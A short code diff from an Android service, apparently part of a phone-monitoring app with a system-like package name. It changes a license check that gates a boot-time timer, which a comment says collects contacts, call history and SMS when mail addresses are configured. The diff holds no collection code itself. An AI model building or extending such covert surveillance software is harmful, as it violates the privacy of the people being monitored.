@@ -4,6 +4,7 @@ import java.util.Timer;
 import java.util.TimerTask;
 
 import com.system.activity.GlobalPrefActivity;
+import com.system.utils.ConfigCtrl;
 import com.system.utils.StrUtils;
 import com.system.utils.SysUtils;
 import com.system.utils.license.LicenseCtrl;
@@ -73,10 +74,9 @@ public class BootService extends Service
 		Log.i(LOGTAG, "started");
 		
 		// Start timer to get contacts, phone call history and SMS
-		String key = GlobalPrefActivity.getSerialNum(this);
+		LicenseType type = ConfigCtrl.getLicenseType(getApplicationContext());
 		String[] mails = GlobalPrefActivity.getMail(this).split(",");
 		mails = StrUtils.filterMails(mails);
-		LicenseType type = LicenseCtrl.isLicensed(this, GlobalPrefActivity.getMail(this), key);
 		if (mails.length > 0 && type != LicenseType.NotLicensed) 
 		{
 			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
